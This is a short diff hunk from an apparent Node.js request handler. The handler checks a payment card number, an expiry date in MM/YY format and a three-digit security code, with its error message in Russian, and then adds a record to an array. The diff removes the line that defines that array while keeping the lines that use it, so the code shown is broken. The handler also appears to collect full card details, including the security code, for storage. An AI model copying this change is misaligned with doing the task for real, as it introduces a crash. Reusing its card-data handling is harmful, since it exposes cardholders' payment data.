@@ -15,7 +15,6 @@ module.exports = (req, res) => {
     return res.status(400).json({error:"Проверьте номер карточки, срок действия в формате MM/YY и внутренний код из 3 цифр."});
   }
 
-  const a=read();
   const id=a.length?Math.max(...a.map(x=>Number(x.id)||0))+1:1;
 
   a.unshift({
